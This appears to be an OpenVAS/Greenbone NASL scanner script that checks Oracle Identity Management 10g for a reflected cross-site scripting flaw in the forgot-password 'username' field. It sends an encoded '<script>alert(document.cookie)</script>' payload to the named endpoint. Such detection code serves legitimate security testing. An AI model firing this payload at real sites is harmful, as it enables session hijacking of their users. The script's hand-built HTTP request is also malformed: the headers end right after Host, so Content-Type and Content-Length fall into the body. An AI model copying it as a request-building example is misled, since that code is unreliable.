# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802465");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2012-10-05 15:31:43 +0530 (Fri, 05 Oct 2012)");
  script_name("Oracle Identity Management 'username' Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2012100042");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/codes/oim_xss.txt");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5110.php");
  script_xref(name:"URL", value:"http://dl.packetstormsecurity.net/1210-exploits/ZSL-2012-5110.txt");
  script_xref(name:"URL", value:"http://www.exploitsdownload.com/exploit/na/oracle-identity-management-10g-cross-site-scripting");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 443);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"Oracle Identity Management 10g httpd version 10.1.2.2.0");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  passed to 'username' parameter via POST method through
  '/usermanagement/forgotpassword/index.jsp' script.");

  script_tag(name:"solution", value:"Update to version 10.1.4.3 or later.");

  script_tag(name:"summary", value:"Oracle Identity Management is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:443);

host = http_host_name(port:port);

res = http_get_cache(item: "/index.html", port:port);

if(res && ">Oracle Identity Management" >< res)
{
  data = "btnSubmit=SUBMIT&username=%22%3E%3Cscript%3Ealert%28document.cookie" +
         "%29%3B%3C%2Fscript%3E";

  req = string("POST /usermanagement/forgotpassword/index.jsp HTTP/1.1\r\n",
               "Host: ", host, "\r\n\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(data), "\r\n", data);

  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "HTTP/1\.. 200" && res && "><script>alert(document.cookie);</script>" >< res &&
     ">Your username '" >< res){
    security_message(port:port);
    exit(0);
  }
}

exit(99);
